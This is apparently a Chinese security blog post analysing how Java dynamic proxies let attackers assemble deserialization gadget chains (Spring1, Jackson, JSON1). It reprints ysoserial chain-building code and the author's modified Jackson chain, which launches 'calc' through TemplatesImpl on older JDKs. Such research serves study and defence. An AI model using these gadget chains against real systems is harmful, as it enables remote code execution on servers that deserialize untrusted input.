---
title: 动态代理在java反序列化中的应用
tags:
  - 动态代理
  - 反序列化
  - Jackson
  - JSON1
  - Spring1
categories:
  - - 漏洞分析
top: 230
abbrlink: 42eb2c82
date: 2025-07-29 17:05:59
---

# 动态代理在Java反序列化中的应用
## 动态代理简介
何为代理？在日常生活中我们或多或少都接触过房产中介、4S店以及各种各样的代理商，他们在经济社会运行当中扮演着代理的角色，负责对接厂商与客户。  
用户如果想要投诉产品、寻求赔偿等，可以统一找到代理商，由代理商向厂商提出，这样便极大的节约了用户的各方面成本。  
在编程中所谓的代理模式也是同样的道理，当我们想要对某一个类进行功能扩展而又不想直接修改当前类的代码的时候，我们可以创建一个代理类来对目标类进行包装。  
通过在当前类的运行前、运行后、运行异常时添加新的代码从而实现目标类功能的增强与拓展。这便是代理模式的运行。如下图，A表示被代理类，B表示代理类，当A没有被代理时，外界的其他方法可以直接调用A的方法，  
当A被代理后，C的方法如果要想调用A的方法就需要先通过B类再由B类调用A类的方法，那么我们便可以在B类中增加一些其他的功能。B类此时就类似一个收保护费的，要想从此过，留下买路钱，正所谓漫天要价，坐地还钱。  
![](003.png)  
代理按照代理类创建的时间节点不同又可分为静态代理与动态代理，所谓静态代理即对每一个被代理类均创建一个对应的代理类以代理其功能并按照需要进行扩展，这样就面临一个困境，即如果有很多的需要被代理的类， 
 那么就需要手动创建对应数量的代理类，这无疑增加了工作量与管理复杂度。
当目标类逐渐在增多时，对应的代理类数量随之扩张。  
![](004.png)  
 而动态代理则能很好地屏蔽这个缺陷，动态代理通过代理接口类实现了代理类的运行时动态生成，无论存在多少被代理类，  
只要他们实现了相关的接口便可以动态地进行代理类的生成。  
当使用动态代理时，无论由多少个目标类A B D ... 只需保证他们都实现了统一接口SA，则只需代理SA接口一次即可对所有的目标类进行统一的管理。  
![](005.png)  
在 `JAVA` 中，动态代理的实现主要依赖于 `Proxy` 类以及相应的 `InvocationHandler` 实现，`Proxy` 类负责代理类的生成，`InvocationHandler` 接口负责目标方法的功能扩展。     
动态代理实现目标类功能扩展的核心在于`InvocationHandler`，用户通过自定义`InvocationHandler`可以实现统一的日志管理，状态检查以及其他更高级的功能，如在本文中将会提及的修改方法返回对象、屏蔽方法调用异常、进行方法调用分流等。  
<!--more-->
## 动态代理的应用
在`JAVA`原生反序列化漏洞的利用过程中，最困难的不在于寻找可控输入的`readObject`方法调用，而在于寻找一条可用的反序列化调用链。  
在寻找反序列化利用链的过程中，可能会遇到如下几个问题：
- 找到了可以进行反射方法调用的地方但是只能调用特定类型的方法；
- 找到了能够调用某个类的所有`getter`的方法但是方法调用顺序是随机的，某些方法的调用会产生异常导致程序退出。  

这些问题都能利用动态代理代理类的特性或者`InvocationHandler`实现的功能解决。  
### 修改方法返回对象
使用 `sun.reflect.annotation.AnnotationInvocationHandler` 可以修改被代理类方法的返回值，其 `invoke` 方法实现如下。  
```java
public Object invoke(Object var1, Method var2, Object[] var3) {
        String var4 = var2.getName();
        Class[] var5 = var2.getParameterTypes();
        if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
            return this.equalsImpl(var3[0]);
        } else if (var5.length != 0) {
            throw new AssertionError("Too many parameters for an annotation method");
        } else {
            switch (var4) {
                case "toString":
                    return this.toStringImpl();
                case "hashCode":
                    return this.hashCodeImpl();
                case "annotationType":
                    return this.type;
                default:
                    Object var6 = this.memberValues.get(var4);
                    if (var6 == null) {
                        throw new IncompleteAnnotationException(this.type, var4);
                    } else if (var6 instanceof ExceptionProxy) {
                        throw ((ExceptionProxy)var6).generateException();
                    } else {
                        if (var6.getClass().isArray() && Array.getLength(var6) != 0) {
                            var6 = this.cloneArray(var6);
                        }

                        return var6;
                    }
            }
        }
    }
```
在上面 `invoke` 方法的实现中，最终的返回值为`var6`，而`var6`来自于`memberValues`对象`get`方法的调用，`memberValues`是一个`Map`对象，其值在`AnnotationInvocationHandler`实例化的过程中被赋予，即该值是可控的。  
`memberValues`对象在取值时其`key`为`var4` ，为被调用方法的方法名，即其值是已知的。又因`invoke`方法的返回值为`Object`类型，故`invoke`方法的返回值可以被修改为用户控制的任意对象。
`AnnotationInvocationHandler`的这一特性在 `Spring1` 链中有所体现。`Spring1`链是在`Spring`框架中发现的一条反序列化利用链，其能达成远程命令执行的效果。  
下面是 `ysoserial` 工具创建`Spring1`链的代码。  
```java
public Object getObject(String command) throws Exception {
		// [0]
        Object templates = Gadgets.createTemplatesImpl(command);
		// [1]
        ObjectFactory objectFactoryProxy = (ObjectFactory)Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class, new Class[0]);
		// [2]
        Type typeTemplatesProxy = (Type)Gadgets.createProxy((InvocationHandler)Reflections.getFirstCtor("org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler").newInstance(objectFactoryProxy), Type.class, new Class[]{Templates.class});
		// [3]
        Object typeProviderProxy = Gadgets.createMemoitizedProxy(Gadgets.createMap("getType", typeTemplatesProxy), Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider"), new Class[0]);
		// [4]
        Constructor mitpCtor = Reflections.getFirstCtor("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
		// [5]
        Object mitp = mitpCtor.newInstance(typeProviderProxy, Object.class.getMethod("getClass"), 0);
		// [6]
        Reflections.setFieldValue(mitp, "methodName", "newTransformer");
		// [7]
        return mitp;
    }
```
在上面的代码中，如果将[1]到[7]看作序列化的过程，那么从[7]到[1]就是反序列化的过程。  
动态代理发挥作用的过程使用下面的图片进行说明。  
![](006.png)  

在反序列化的过程中首先被调用的是`SerializableTypeWrapper$MethodInvokeTypeProvider`的 `readObject` 方法  
```java
private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException {
            inputStream.defaultReadObject();
			// [8]
            Method method = ReflectionUtils.findMethod(this.provider.getType().getClass(), this.methodName);
			// [9]
            this.result = ReflectionUtils.invokeMethod(method, this.provider.getType());
        }
    }
```
在标记[9]的地方`invokeMethod`方法被调用，通过反射进行无参方法调用，参数`method`为`Method`对象，`this.provider.getType()`则用于指定调用方法所属对象。  
众所周知，`TemplatesImpl`类的`newTransformer`方法是一个常用的反序列化链片段，刚好该方法是一个无参方法。 所以如果`method`刚好是`newTransformer`方法，`this.provider.getType()`刚好返回`TemplatesImpl`对象就恰到好处了。  
`method`来自于标记[8]的方法调用。这也是一个反射方法调用，所以只需要在构造`SerializableTypeWrapper$MethodInvokeTypeProvider`对象时设置`methodName`属性为`newTransformer`即可。  
调用方法的问题解决了，还需要调用对象的配合，调用对象来自于`this.provider.getType()`的配合，`this.provider`是一个`TypeProvider`类型，观察其`getType`方法的签名发现该方法返回值类型为`Type`类型，与所需的`TemplatesImpl`类型不匹配。    
一般情况下路走到这里就走到死胡同了，不过通过签名提到的`AnnotationInvocationHandler`的特性我们可以将这个死胡同打穿形成一条新的路。  
`AnnotationInvocationHandler`的`invoke`方法调用可以修改被代理方法的返回值，所以可以创建一个代理类代理 `SerializableTypeWrapper$TypeProvider`类，将`TemplatesImpl`对象以方法名`getType`为`key`放到`AnnotationInvocationHandler`的`memberValues`对象中。  
这便是本节标记[3]处代码的意义。  
到了这里似乎就可以结束了，但是前面忽略了一点就是`getType`本身是返回`Type`类型的，虽然替换了返回结果为`TemplatesImpl`满足了反序列化链的需求，但是`TemplatesImpl`本身并不实现`Type`接口。  
那么便可以继续生成一个代理类让其同时实现`Type`以及`Templates`接口，这便是本节标记[2]处代码的意义。  
`AutowireUtils$ObjectFactoryDelegatingInvocationHandler`的`invoke`方法是这样的。其会从`ObjectFactory` 属性中通过`getObject方`法 获取目标对象，若要使得`getObject`方法返回`TemplatesImpl` 对象，  
则需要再次使用`AnnotationInvocationHandler`代理`ObjectFactory`。 这就是本节标记[1]处代码的意义。  
```java
public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            String methodName = method.getName();
            if (methodName.equals("equals")) {
                return proxy == args[0];
            } else if (methodName.equals("hashCode")) {
                return System.identityHashCode(proxy);
            } else if (methodName.equals("toString")) {
                return this.objectFactory.toString();
            } else {
                try {
                    return method.invoke(this.objectFactory.getObject(), args);
                } catch (InvocationTargetException var6) {
                    throw var6.getTargetException();
                }
            }
        }
```
通过上面的分析可知，在`Spring1` 链中，多次使用了`AnnotationInvocationHandler`可以修改方法调用的放回值的特性利用动态代理机制完成反序列化利用链片段的连接。  
当然，`AnnotationInvocationHandler`的使用并不是没有限制的。 首先我们从上面`Spring1`链的分析中得知 `AnnotationInvocationHandler`的`invoke`方法在调用完成后返回被修改后的对象，  
该对象要保证能够被接受的变量所兼容，即需要保证接收变量为该返回值的父类型，在`Spring1`的例子中invokeMethod的方法签名的第二个参数用于接收修改后的对象，恰好其为`Object`类型为所有类型的父类型所以并没有发生异常。
```java
public static Object invokeMethod(Method method, Object target)
```
而在代理`getType`方法时，因为`getType`方法本身接收的响应类型为`Type`类型，而我们希望响应`TemplatesImpl`类型，所以需要额外借助`AutowireUtils$ObjectFactoryDelegatingInvocationHandler`再创建一个代理类同时代理`Type`以及`Templates`类型以达到目的。  
所以当`AnnotationInvocationHandler`被用作替换对象类型的时候往往不是单独使用的，其往往需要其他代理类来代理特定的类型以避免类型转换异常。  

### 无关方法调用屏蔽
`Jackson`是`JAVA`中使用广泛的一个处理`JSON`字符串的工具包，在`Jackson`的代码中存在一条完成的`JAVA`反序列化利用链。该链在实际使用过程中偶尔会执行错误导致不能成功进行命令执行，   
这源于该链执行过程中使用的`TemplatesImpl`对象的`getOutputProperties`方法调用不稳定，当 `getStylesheetDOM` 先于`getOutputProperties`被调用时将导致反序列化失败。  
在实践中我们发现当这出现这种情况时，无论你重新尝试多少次都不会再成功执行，除非目标系统重启。  
失败的原因在于`getStylesheetDOM`方法调用时`_sdom`的值为空，又因为`_sdom`是一个被`transient`修饰的瞬态变量并不参与`JAVA`原生的序列化与反序列化。
为了解决这一问题，在`Jackson`链的实践中使用了动态代理的特性：**使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法**。  
具体的操作方法是创建目标类的代理类，代理其某一个接口，如果该接口定义了我们希望调用的方法而没有定义其他的不被希望调用的方法，那么在通过反射获取代理类的方法时只能获取到被代理接口中定义的方法。  
下面图片简要总结了`Jackson`链调用过程以及增加动态代理后程序的执行逻辑。     
![](007.png)  
以下代码是`ysoserial`中生成`Jackson`链`Payload`的代码。  
```java
public static void main(String[] args) throws Exception {
		// [0]
        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
		// [1]
        Object templates = Gadgets.createTemplatesImpl("calc");
		// [2]
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
		// [3]
        POJONode node = new POJONode(proxy);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);
		// [4]
        byte[] serialize = Serializer.serialize(val);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
```
在标记代码块[3]中使用了`BadAttributeValueExpException` 作为反序列化的起始点，`BadAttributeValueExpException`是一个比较常用的类，其`readObject`方法调用会触发`val`属性值的`toString`方法。 
将`val`设置为一个`POJONode`对象，其`toString`方法定义在父类`BaseJsonNode`方法中。  
```java
public String toString() {
        return InternalNodeMapper.nodeToString(this);
    }
```
`nodeToString`方法将调用`STD_WRITTER`的`writeValueAsString`方法，该方法在调用过程中会通过反射的方式尝试获取`POJONode`方法实例化时传入参数对象的所有`getter`方法，然后按照获取顺序依次调用。
```java
public static String nodeToString(BaseJsonNode n) {
        try {
            return STD_WRITER.writeValueAsString(_wrapper(n));
        } catch (IOException var2) {
            throw new RuntimeException(var2);
        }
    }
```
`getter`方法的获取顺序是随机的并且会被缓存机制缓存，当`StylesheetDOM`的获取在`OutputProperties`之前时便会因为`_sdom`为空导致程序异常退出。  
![](001.png)  
为了处理这个问题使用了`JdkDynamicAopProxy`代理`Templates`接口创建代理类，代理类在通过反射获取方法时只能获取到被代理接口中定义的方法，如此便可以屏蔽掉`getStylesheetDOM`方法，这便是标记代码块[2]处代码的意义。  
### 方法调用分流
如上一节通过代理接口屏蔽无关方法调用从而屏蔽异常的方式有严格的限制，需要满足恰好被代理接口定义了我们需要的目标方法且没有定义一些其他的可能对结果产生干扰的方法，这种情况往往可遇不可求。本节将提供另外一种对方法调用异常进行屏蔽的方法。   
`CompositeInvocationHandlerImpl`能够对方法调用异常进行屏蔽的核心在于其能根据方法名对方法的调用进行分流，对于在调用过程中会导致异常的方法通过`AnnotationInvocationHandler`直接替换掉响应结果即可屏蔽可能导致异常的过程调用。  
具体的实现方法是通过将可能导致异常的方法所属类作为`key`，将`AnnotationInvocationHandler`作为`value`放到一个`Map`中，当方法调用时首先尝试从这个`Map`中获取对应的`handler`再使用该`handler`进行实际的方法调用。  
```java
public Object invoke( Object proxy, Method method, Object[] args )
        throws Throwable
    {
        Class cls = method.getDeclaringClass() ;
        InvocationHandler handler =
            (InvocationHandler)classToInvocationHandler.get( cls ) ;
        if (handler == null) {
            if (defaultHandler != null)
                handler = defaultHandler ;
            else {
                ORBUtilSystemException wrapper = ORBUtilSystemException.get(
                    CORBALogDomains.UTIL ) ;
                throw wrapper.noInvocationHandler( "\"" + method.toString() +
                    "\"" ) ;
            }
        }
        return handler.invoke( proxy, method, args ) ;
    }
```
`json-lib`同样是用来处理`JSON`字符串的`Java`工具包，其中也存在一条反序列化利用链，这条链被成为`JSON1`。
在`JSON1`链中便使用了方法调用分流方式来屏蔽`getCompositeType`方法调用导致的异常。  
```java
public static Map makeCallerChain(Object payload, Class... ifaces) throws OpenDataException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException {
        CompositeType rt = new CompositeType("a", "b", new String[]{"a"}, new String[]{"a"}, new OpenType[]{SimpleType.INTEGER});
        TabularType tt = new TabularType("a", "b", rt, new String[]{"a"});
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(payload);
		// [1]
        InvocationHandler delegateInvocationHandler = (InvocationHandler)Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", new Object[]{as});
		// [2]
        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
		// [3]
        InvocationHandler invocationHandler = (InvocationHandler)Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl", new Object[0]);
        ((Map)Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(CompositeData.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
		// [4]
        CompositeData cdsProxy = (CompositeData)Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);
        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
		// [5]
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);
		// [6]
        return Gadgets.makeMap(t1, t2);
    }
```
`JSON1`在反序列化的过程中会触发`getCompositeType`方法并产生异常，故使用`CompositeInvocationHandlerImpl`对`CompositeData`类中的`getter`进行分流处理，使用`AnnotationInvocationHandler`直接响应有效对象避免调用过程中的异常。  
而对于需要调用的目标方法（TemplatesImpl的getOutputProperties方法）则使用`JdkDynamicAopProxy`代理进行简单的反射方法调用即可。    
`JSON1`链的简要调用流程图下。  
![](009.png)  
## 拓展
在`JSON1`的例子中我们使用了`CompositeInvocationHandlerImpl`根据方法声明类选择不同的`invocationHandler`对方法进行处理，其目的是为了屏蔽`getCompositeType`调用异常，  
同样的在`Jackson`中也存在方法调用异常，不过在这里利用的却是反射获取代理类的特性。那么是否可以将`CompositeInvocationHandlerImpl`用于`Jackson`中呢？  
以下是对原始的`Jackson`链进行改造后的代码。  
```java
CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();
        Object templates = Gadgets.createTemplatesImpl("calc");

//        AdvisedSupport advisedSupport = new AdvisedSupport();
//        advisedSupport.setTarget(templates);
//        Constructor constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
//        constructor.setAccessible(true);
//        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
//        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);

        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(templates);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", new Object[]{as});
        // 此处传入到JdkDynamicAopProxy中的参数也为as，因为StylesheetDomHandler只是用来充数的，其功能并不重要，重要是有而不是功能，因为并不会有方法调用会触发到该处理器的invoke方法
        InvocationHandler StylesheetDomHandler = (InvocationHandler) Reflections.newInstance("org.springframework.aop.framework.JdkDynamicAopProxy", new Object[]{as});
        Class<?>[] allIfaces = (Class[])((Class[]) Array.newInstance(Class.class, 2));
        allIfaces[0] = Serializable.class;
        allIfaces[1] = DOM.class;
        // 创建代理类同时代理DOM接口以及Serializable接口，因为getStylesheetDOM方法需要响应一个 DOM 类型对象，但是DOM的几个实现类都没有实现Serializable接口不可序列化
        // 所以需要同时代理 Serializable 接口
        Object o = Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, StylesheetDomHandler);
        //
        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getStylesheetDOM", o));
        InvocationHandler invocationHandler = (InvocationHandler)Reflections.newInstance("com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl", new Object[0]);
        // getStylesheetDOM的定义类为 TemplatesImpl 所以这里通过 TemplatesImpl.class 索引
        // 当getStylesheetDOM方法被调用是就会使用 cdsInvocationHandler 来进行实际的方法调用
        // cdsInvocationHandler 是一个 AnnotationInvocationHandler 对象可以用来替换返回对象类型。
        ((Map)Reflections.getFieldValue(invocationHandler, "classToInvocationHandler")).put(TemplatesImpl.class, cdsInvocationHandler);
        Reflections.setFieldValue(invocationHandler, "defaultHandler", delegateInvocationHandler);
        Templates cdsProxy = Gadgets.createProxy(invocationHandler, Templates.class);

        POJONode node = new POJONode(cdsProxy);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", node);


        byte[] serialize = Serializer.serialize(val);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();

```
运行修改后的`Jackson`链，正常弹出计算器，同时在日志中同样可以查看目标方法被成功调用  
![](002.png)  
在`jdk8u71`以下版本的运行环境中该修改可以成功运行，但在之后的版本中该修改是不能成功运行的，原因在于使用了`AnnotationInvocationHandler`来替换`getStylesheetDOM`的响应结果，  
`AnnotationInvocationHandler`在`jdk8u71`后被增加了新的限制，其只能代理使用了注解的方法，如：`@Override` 注解等。在`JSON1`链中我们代理的`getCompositeType`方法便存在注解`@Override`，所以不受`jdk`版本限制。  
## 总结
随着技术的发展以及JDK不断地更新，`AnnotationInvocationHandler`的使用被加上了限制，在jdk8u71后已经不再能够被随意使用。虽然如此，利用动态代理思想解决问题的思路是一以贯之的。
在不同的实践中也可能存在着其他更具利用价值的`InvocationHandler`值得我们去发掘。攻防对抗就是这样魔高一丈道高一尺，只有在攻与防的不断对抗中砥砺前行才能发现更多有效的思路与技巧。